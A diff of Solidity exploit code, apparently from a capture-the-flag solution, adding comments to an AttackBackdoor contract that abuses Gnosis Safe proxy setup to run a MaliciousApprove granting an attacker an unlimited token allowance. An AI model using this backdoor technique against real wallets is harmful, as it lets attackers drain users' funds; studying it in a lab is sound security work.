@@ -11,7 +11,7 @@ interface IGnosisFactory {
         IProxyCreationCallback callback
     ) external returns (GnosisSafeProxy proxy);
 }
-
+ 
 contract MaliciousApprove {
     function approve(address attacker, IERC20 token) public {
         token.approve(attacker, type(uint256).max);
@@ -36,6 +36,14 @@ contract AttackBackdoor {
 
         // Deploy malicious backdoor for approve
         maliciousApprove = new MaliciousApprove();
+
+        /**
+         * Process of attack
+         * 1) setup all the requirement conditions
+         * 2) Using GnosisSafe contract create a multisig wallet to owner one-by-one by calling setUp function.
+         * 3) After getting initializer data create proxy with createProxyWithCallback from factory contract
+         * 4) In setup pass the calldata to maliciousApprove to the attacker contract.
+         */
 
         // Create a new safe through the factory for every user
         bytes memory initializer;
